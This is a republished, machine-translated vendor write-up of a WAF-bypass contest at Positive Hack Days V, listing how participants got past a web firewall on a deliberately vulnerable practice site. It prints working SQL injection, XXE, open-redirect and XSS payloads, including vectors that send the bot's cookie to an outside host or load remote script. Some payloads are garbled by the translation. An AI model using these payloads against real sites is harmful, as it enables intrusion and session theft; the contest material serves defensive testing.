<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Positive Hack Days V WAF Bypass Contest</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Like last year , the WAF Bypass competition was held at Positive Hack Days international practical security forum. The task of the participants is to ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Positive Hack Days V WAF Bypass Contest</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/c28/e03/2ea/c28e032ea084411192d061142d202345.jpg"><br><br>  Like <a href="http://habrahabr.ru/company/pt/blog/229479/">last year</a> , the WAF Bypass competition was held at Positive Hack Days international practical security forum.  The task of the participants is to circumvent the protection of <a href="http://www.ptsecurity.com/products/af/">PT Application Firewall</a> , a web firewall from Positive Technologies.  The site Choo Choo Roads was created specifically for the competition with typical vulnerabilities: Cross-Site Scripting, SQL Injection, XML External Entities Injection, Open Redirect, etc. The bypass test for each vulnerability was MD5 flags for which points were awarded.  Flags were located in the file system, database, cookies, which were assigned to a special bot written using Selenium. <br><a name="habracut"></a><br><img src="https://habrastorage.org/files/d70/d0e/feb/d70d0efeb96347eead9317f497e32538.png"><br><br>  The WAF configuration for the competition provided for rounds; however, according to the results, we also received non-standard solutions.  Actually, for this purpose the competition was created - to give participants the opportunity to try their hand at circumventing the checks and thus help us improve the mechanisms for protecting the product.  So, let's start with an overview of vulnerabilities and their workarounds. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h3>  Warmup </h3><br>  The vulnerability was present in the script, which tracked the user's activity on the site: <br><br><pre> POST /online.php HTTP / 1.1
 Host: choo-choo.phdays.com
 Connection: keep-alive
 Content-Length: 24
 Content-Type: application / json
 User-Agent: Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 31.0.1650.48 Safari / 537.36

 {"timestamp": 1432906707}
</pre><br>  The values ‚Äã‚Äãof the timestamp field from the JSON data in the POST request were not validated before use in the SQL query: <br><br><pre> &lt;br /&gt;
 &lt;b&gt; Warning &lt;/ b&gt;: pg_query (): Query failed: ERROR: invalid input syntax for integer: "1432906707 '"
 LINE 1: UPDATE activity SET timestamp = '1432906707' '' WHERE id = 1
                                         ^ in &lt;b&gt; /var/www/php/online.php &lt;/ b&gt; on line &lt;b&gt; 8 &lt;/ b&gt; &lt;br /&gt;
 {"ok": false}
</pre><br>  It was possible to bypass the check by changing the Content-Type, for example, to text / xml, as a result of which the POST data was not processed as JSON (the check was disabled). <br><br><pre>  &lt;br /&gt;
 &lt;b&gt; Warning &lt;/ b&gt;: pg_query (): Query failed: ERROR: invalid syntax for integer: "d2a5400fc306d25b6886612cd203a77e | 26.05 15:30 - Industry monopolist" for &lt;/ b&gt; var / www / php / online.php &lt;/ b&gt; on line &lt;b&gt; 8 &lt;/ b&gt; &lt;br /&gt;
 {"ok": false}
</pre><br><h3>  XSD validation </h3><br>  The site was attended by a form for searching tickets, which was carried out by generating XML and sending a request for the backend. <br><br><pre> POST /tickets.php HTTP / 1.1
 Host: choo-choo.phdays.com
 Connection: keep-alive
 Content-Length: 220
 Content-Type: text / xml

 &lt;search id = "RAILWAYS14329105659180.522099320078" xmlns: xsi = "http://www.w3.org/2001/XMLSchema-instance" xsi: schemalocation = "tickets.xsd"&gt;
	 &lt;from&gt; Moscow &lt;/ from&gt;
	 &lt;to&gt; Saint-Petersbourg &lt;/ to&gt;
	 &lt;date&gt; 05/30/2015 &lt;/ date&gt;
 &lt;/ search&gt;
</pre><br>  For the XML request, the XSD scheme was used: <br><br><pre> &lt;? xml version = "1.0" encoding = "UTF-8"?&gt;
 &lt;xs: schema xmlns: xs = "http://www.w3.org/2001/XMLSchema"&gt;
     &lt;xs: element name = "search"&gt;
       &lt;xs: complexType&gt;
         &lt;xs: sequence&gt;
           &lt;xs: element name = "from" type = "xs: string" /&gt;
           &lt;xs: element name = "to" type = "xs: string" /&gt;
           &lt;xs: element name = "date" type = "xs: string" /&gt;
         &lt;/ xs: sequence&gt;
         &lt;xs: attribute name = "id" use = "required"&gt;
             &lt;xs: simpleType&gt;
             &lt;xs: restriction base = "xs: string"&gt;
               &lt;xs: length value = "35" /&gt;
             &lt;/ xs: restriction&gt;
           &lt;/ xs: simpleType&gt;
         &lt;/ xs: attribute&gt;
       &lt;/ xs: complexType&gt;
     &lt;/ xs: element&gt;
 &lt;/ xs: schema&gt;
</pre><br>  The attribute ‚Äúid‚Äù, according to the scheme, must have a length of 35 characters.  The value of the attribute fell into the SQL query without validation.  To bypass it was required to construct a vector satisfying the requirements of the XSD scheme. <br><br><pre> &lt;search id = "'); select box (flag) from flag --____"&gt;
</pre><br><pre> &lt;search id = "'); select flag :: int from flag -"&gt;
</pre><br><h3>  Open redirect </h3><br>  The vulnerability was present in the "to" parameter of the "redirect.php" script.  The flag was transmitted in the fragment part of the URL where the redirect occurred, i.e. it was not sent to the server part.  To get the flag, it was necessary to send the bot to a third-party site with a page that would have to extract the value from location.hash and send it to the logger. <br><br>  Workarounds: <br><br><ul><li><pre>  http://choo-choo.phdays.com/redirect.php?to=phdays.com: asd@host.com </pre></li><li><pre>  http://choo-choo.phdays.com/redirect.php?to=http://ahack.ru%23.phdays.com/ </pre></li><li><pre>  http://choo-choo.phdays.com/redirect.php?to=http%3a//www.samincube.com%3f\..\\wwww.phdays.com </pre></li></ul><br><h3>  XML External Entities Injection </h3><br>  The script processing the XML data was exposed to XXE.  The traversal required the use of an external entity inside the parameter entity: <br><br><pre>  &lt;! DOCTYPE search [
 &lt;! ENTITY% asd "&lt;! ENTITY% asd1 SYSTEM 'flag'&gt;"&gt;
 % asd;
 % asd1;
 ]&gt; </pre><br>  It was also possible to bypass using the UTF-16 encoding: <br><br><pre> &lt;? xml version = "1.0" encoding = "UTF-16"?&gt;
</pre><br><h3>  Cross Site Scripting </h3><br>  Vulnerability was laid on the site search page.  To get the flag, you had to send a bot cookie to your site.  To work around, you could use non-standard tag attributes that are processed by the bootstrap-validator library, allowing you to execute the JS code: <br><br><pre>  http://choo-choo.phdays.com/index.php?search=&lt;form+data-toggle="validator"&gt;&lt;div+data-match="&lt;img+src%3Dhttp://test.com+ onerror% 3Dthis.src% 2B% 3Ddocument.cookie /&gt; "&gt; &lt;/ div&gt; &lt;/ form&gt; </pre><br><br>  Or so: <br><br><ul><li><pre>  http://choo-choo.phdays.com/index.php?search=&lt;%&lt;script src = '// ahack.ru/test.js'&gt; &lt;/ script&gt; </pre></li><li><pre>  http://choo-choo.phdays.com/index.php?search=&lt;%00&lt;script src = '// artsploit.com/xss'&gt; &lt;/ script&gt; </pre></li></ul><br><h2>  results </h2><br><img src="https://habrastorage.org/files/69f/853/9e2/69f8539e2c974fd18c1b5ab7bebc7ded.png"><br><br>  As in the past year, the bushwhackers team took the first place: Georgy Noseyevich, Andrei Petukhov and Alexander Razdobarov.  They decided all the tasks on the first day!  The second place was taken by Mikhail Stepankin (ArtSploit), and the third - Eldar Zaitov ( <a href="http://habrahabr.ru/users/kyprizel/" class="user_link">kyprizel</a> ).  For the first place we awarded iPad Air 2, for the second - Sony Xperia Z3, for the third - the annual license of the program Burp Suite Professional. <br><br>  During the competition, <b>271390</b> requests were blocked (two times more than last year).  <b>302</b> participants were registered (last year 101).  Only <b>18</b> people were able to get at least one flag. <br><br><img src="https://habrastorage.org/files/6c0/ddb/2c6/6c0ddb2c6c1a4f048798800d1f9361f6.png"><br><br>  Thanks to all participants! </div><p>Source: <a href="https://habr.com/ru/post/259129/">https://habr.com/ru/post/259129/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../259119/index.html">Automatic update of IP phones in 3CX. Part two. Practice</a></li>
<li><a href="../259121/index.html">Little tricks of passport collection</a></li>
<li><a href="../259123/index.html">Android M and Developer Tools</a></li>
<li><a href="../259125/index.html">Lectures Technopark. Semester 2 Java</a></li>
<li><a href="../259127/index.html">My Internet of Things: Guest Castle</a></li>
<li><a href="../259133/index.html">IBM cloud grant up to $ 120,000 awaits you at Startup Village</a></li>
<li><a href="../259135/index.html">What was on PHDays V: signs of interception of GSM-signal, the best time to hack Wi-Fi, the future of encryption</a></li>
<li><a href="../259137/index.html">VKontakte launches BugBounty program</a></li>
<li><a href="../259139/index.html">UniFi Controller, displaying RADIUS logins</a></li>
<li><a href="../259141/index.html">Russification and multilingual OpenStreetMap cards</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>